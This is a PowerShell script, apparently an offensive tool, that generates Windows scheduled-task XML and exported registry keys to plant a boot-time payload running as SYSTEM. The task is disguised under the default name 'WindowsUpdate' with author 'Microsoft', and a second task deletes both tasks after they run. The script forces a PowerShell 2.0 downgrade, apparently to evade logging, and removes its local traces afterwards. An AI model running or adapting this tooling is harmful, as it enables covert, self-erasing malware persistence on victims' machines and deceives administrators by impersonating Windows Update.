$PayloadTemplate = "<?xml version=`"1.0`" encoding=`"UTF-16`"?>
<Task version=`"1.2`" xmlns=`"http://schemas.microsoft.com/windows/2004/02/mit/task`">
  <RegistrationInfo>
    <Date>2017-07-07T10:05:00.6482813</Date>
    <Author>AUTHOR</Author>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT3M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id=`"Author`">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=`"Author`">
    <Exec>
      <Command>COMMAND</Command>
      <Arguments>ARGUMENTS</Arguments>
    </Exec>
  </Actions>
</Task>"

$CleanupTemplate = "<?xml version=`"1.0`" encoding=`"UTF-16`"?>
<Task version=`"1.3`" xmlns=`"http://schemas.microsoft.com/windows/2004/02/mit/task`">
  <RegistrationInfo>
    <Date>2017-07-11T10:04:08.849</Date>
    <Author>AUTHOR</Author>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id=`"Author`">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=`"Author`">
    <Exec>
      <Command>schtasks</Command>
      <Arguments>/Delete /F /TN `"TASKNAME`"</Arguments>
    </Exec>
    <Exec>
      <Command>schtasks</Command>
      <Arguments>/Delete /F /TN `"CleanupTASKNAME`"</Arguments>
    </Exec>
  </Actions>
</Task>"


#run powershell 2.0
if ($PSVersionTable.PSVersion -gt [Version]"2.0") {
  powershell -Version 2 -File $MyInvocation.MyCommand.Definition
  exit
}


#Replaces the variables in the template
function ReplaceVariables ($template, $payload, $Author, $TaskName, $command)
{
	$template = $template -creplace "COMMAND",$command
	$template = $template -creplace "ARGUMENTS",("/c "+ $Payload)
	$template = $template -creplace "AUTHOR",$Author
	$template = $template -creplace "TASKNAME",$TaskName
	return $template
}

#extracts the registry keys
function ExtractKeys($ShellPath, $TaskName, $XML)
{
    schtasks /Create /TN $TaskName /XML $XML
    reg export "`"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName`"" (Join-Path $ShellPath ($TaskName + "-1.reg")) "/y" 
    
    #Get scheduled task ID and export remaining registry keys
    $key = "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\" + $TaskName
    $TaskID = (Get-ItemProperty -Path $key -Name Id).Id
    write-host $TaskID
    reg export "`"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$TaskID`"" (Join-Path $ShellPath ($TaskName + "-2.reg")) "/y"
    reg export "`"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\$TaskID`""  (Join-Path $ShellPath ($TaskName + "-3.reg")) "/y"
    Copy-Item "C:\Windows\System32\Tasks\$TaskName" $ShellPath #Copy job file

}

#Read in user parameters and load templates
$DefaultTaskName = "WindowsUpdate"
$PayloadName = Read-Host "Input Task Name (Default: WindowsUpdate)"
$PayloadName = ($DefaultTaskName,$PayloadName)[[bool]$PayloadName]
$CleanupName = "Cleanup" + $PayloadName

$DefaultAuthor = "Microsoft"
$Author = Read-Host "Input Author (Default: Microsoft)"
$Author = ($DefaultAuthor,$Author)[[bool]$Author]


$Payload = Read-Host -Prompt "Enter Path to Payload File"
$command = "cmd.exe"
$payload = Get-Content $payload
$ShellPath=Join-Path $pwd "shell_files"
New-Item -ItemType Directory -Force -Path (Join-Path $pwd "shell_files") #create shell_files folder


#Create Scheduled Tasks from Templates
$PayloadTask = ReplaceVariables $PayloadTemplate $Payload $Author $PayloadName $command
$CleanupTask = ReplaceVariables $CleanupTemplate $payload $Author $PayloadName $command
$PayloadXML = Join-Path $pwd.ToString() ($PayloadName +  ".xml")
$PayloadTask | Out-File $PayloadXML
$CleanupXML = Join-Path $pwd.ToString() ($CleanupName + ".xml")
$CleanupTask | Out-File $CleanupXML


#ExtractKeys($ShellPath, $TaskName, $XML)
Extractkeys $ShellPath $PayloadName $PayloadXML
Extractkeys $ShellPath $CleanupName $CleanupXML


#Cleanup
Remove-Item $PayloadXML
Remove-Item $CleanupXML
schtasks /Delete /F /TN $PayloadName
schtasks /Delete /F /TN $CleanupName

